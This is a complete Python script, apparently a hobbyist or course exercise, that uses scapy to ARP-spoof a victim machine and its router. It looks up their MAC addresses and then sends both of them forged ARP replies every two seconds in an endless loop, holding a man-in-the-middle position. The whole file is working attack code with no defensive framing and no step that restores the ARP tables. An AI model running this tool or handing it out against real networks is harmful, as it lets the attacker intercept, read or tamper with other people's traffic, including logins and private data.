
import scapy.all as scapy
from argparse import ArgumentParser
import time


def get_args():
    parser = ArgumentParser()
    parser.add_argument("-t1",
                        "--target1",
                        dest="target_1",
                        required=True,
                        help="Target IP Address of Victim MACHINE")
    
    parser.add_argument("-t2",
                        "--target_2",
                        dest="target_2",
                        required=True,
                        help="Target IP Address of Victime Router"
                        )
    return parser.parse_args()

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broad = broadcast/arp_req
    response = scapy.srp(arp_req_broad, timeout=1, verbose=False)[0]
    #print(response)
    if len(response) == 0:
        print("\n[-] Target -> ",ip," is down") 
        exit(0)
    return response[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    #print(target_mac)
    packet = scapy.ARP(op=2, 
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=spoof_ip)
    scapy.send(packet, verbose=False)

#---MAIN---#
res = get_args()

t_ip1, t_ip2 = res.target_1, res.target_2
count = 0
while True:
    # ARP tables are reset to original values during each HTTP req-resp cycle
    # to maintain MITM persistence -> loop
    spoof(t_ip1, t_ip2)
    spoof(t_ip2, t_ip1)
    print("\r[+] Packets sent ->", count, end='')
    count+=2
    # delay req to prevent network overload
    time.sleep(2)
